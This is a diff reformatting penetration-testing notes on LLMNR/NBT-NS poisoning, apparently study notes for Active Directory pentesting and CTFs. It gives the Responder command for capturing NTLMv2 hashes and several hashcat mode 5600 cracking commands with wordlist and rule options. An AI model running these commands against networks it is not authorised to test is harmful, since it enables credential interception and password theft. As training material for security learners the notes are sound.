@@ -1,41 +1,51 @@
 # LLMNR Poisoning
 
-Link-local multicast name resolution - Most common attack
+**Link-Local Multicast Name Resolution** - One of the most common AD attacks.
 
-Good to use when lots of traffic
+## Overview
 
-Used to identify hosts when DNS fails to do so
+- Used to identify hosts when DNS fails
+- Previously known as NBT-NS
+- Best used when there's lots of network traffic
+- Man-in-the-middle attack
 
-Previously NBT-NS
+**Key Flaw:** Services transmit username and NTLMv2 hash, allowing interception.
 
-The key flaw is that the services utilize a user's username and NTLMv2 hash appropriately
+## Attack with Responder
 
-Intercept traffic - able to get username and hash
+```bash
+sudo responder -I tun0 -dw
+```
 
-Man-In-The-Middle attack
+Note: Can only use one of `-d`, `-w`, or `-P` at a time.
 
-<figure><img src="../../.gitbook/assets/image.png" alt=""><figcaption></figcaption></figure>
+## Cracking Captured Hashes
 
-Responder
+Find the correct hashcat mode:
 
-sudo responder -I tun0 -dw -- Can not use dwP as only one switch can be used
-
-
-
-<figure><img src="../../.gitbook/assets/image (1).png" alt=""><figcaption></figcaption></figure>
-
-
-
+```bash
 hashcat --help | grep NTLM
+```
 
-{% embed url="https://hashcat.net/wiki/doku.php?id=example_hashes\" %}
+Reference: https://hashcat.net/wiki/doku.php?id=example_hashes
 
-hashcat -m 5600 hash.txt /wordlist/location use --force if not working in VM/ -0 increase speed of cracking
+Crack NTLMv2 (mode 5600):
 
-rockyou2021 - 91 gb of passwords
+```bash
+# Basic
+hashcat -m 5600 hash.txt /path/to/wordlist
 
-Can take several hours to crack
+# With rules (better for real engagements)
+hashcat -m 5600 hash.txt /path/to/wordlist -r OneRule
 
-use rule sets in IRL and not so much in CTFs
+# Force flag if issues in VM
+hashcat -m 5600 hash.txt /path/to/wordlist --force
 
-hashcat -m 5600 hash.txt /wordlist/location -r OneRule
+# Optimized mode
+hashcat -m 5600 hash.txt /path/to/wordlist -O
+```
+
+**Notes:**
+- rockyou2021 is 91GB of passwords
+- Can take several hours to crack
+- Use rule sets in real engagements, less so in CTFs
